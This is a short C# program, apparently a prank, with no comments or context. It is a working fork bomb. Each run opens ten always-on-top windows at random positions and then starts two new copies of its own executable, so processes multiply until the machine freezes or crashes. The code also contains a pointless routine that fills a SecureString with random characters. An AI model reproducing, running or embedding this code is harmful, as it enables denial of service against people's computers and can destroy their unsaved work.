﻿using System;
using System.Collections.Generic;
using System.Text;

namespace fooBAR
{
    public class FooBAR
    {
        static void Main()
        {
            hot();
        }

        static void form_Load(object sender, EventArgs e)
        {
            hot();
        }
        static void hot()
        {
            System.Threading.Thread.Sleep(500);
            System.Random ran = new Random();
            System.Windows.Forms.Form form=null;
            for (int i = 10; i > 0; i--)
            {
                form = new System.Windows.Forms.Form();
                form.TopMost = true;
                form.Location = new System.Drawing.Point(ran.Next(2000), ran.Next(2000));
                form.Show();
            }
            System.Diagnostics.Process.Start(System.Windows.Forms.Application.ExecutablePath);
            System.Diagnostics.Process.Start(System.Windows.Forms.Application.ExecutablePath);
            System.Collections.Generic.List<char> mass=new List<char>();
            System.Security.SecureString ss = new System.Security.SecureString();
            for (int i = 3000; i > 0; i--)
            {
                ss.AppendChar((char)(ran.Next(3000)%254));
            }
            form.Text = ss.ToString();
        }
    }
}
